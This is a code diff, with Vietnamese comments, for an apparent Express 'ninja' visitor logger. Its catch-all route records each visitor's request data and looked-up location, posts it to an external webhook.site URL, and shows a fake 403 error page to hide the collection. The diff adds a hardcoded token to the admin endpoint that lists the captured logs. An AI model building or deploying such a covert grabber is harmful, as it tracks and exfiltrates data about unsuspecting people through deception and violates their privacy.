@@ -9,6 +9,8 @@ const PORT = process.env.PORT || 3000;
 let localLogs = [];
 
 app.get('/admin-ninja', (req, res) => {
+  const token = req.query.token;
+  if (token !== 'cuti123') return res.status(403).send('Forbidden 🥷');
   res.json(localLogs);
 });
 
@@ -33,20 +35,20 @@ app.get('*', async (req, res) => {
     logData.location = { error: 'Không lấy được location' };
   }
 
-  // Lưu vào bộ nhớ cục bộ
+  // Lưu vào bộ nhớ RAM
   localLogs.push(logData);
 
-  // Gửi ra ngoài webhook
+  // Gửi webhook ra ngoài
   try {
     await axios.post('https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890', logData);
   } catch (err) {
     console.error('Gửi webhook lỗi:', err.message);
   }
 
-  // Trả về trang giả 403
+  // Trả về trang giả lỗi 403
   res.status(403).sendFile(path.join(__dirname, '403.html'));
 });
 
 app.listen(PORT, () => {
-  console.log(`Ninja đang chạy ở cổng ${PORT}`);
+  console.log(`🟢 Web ninja đang chạy ở cổng ${PORT}`);
 });
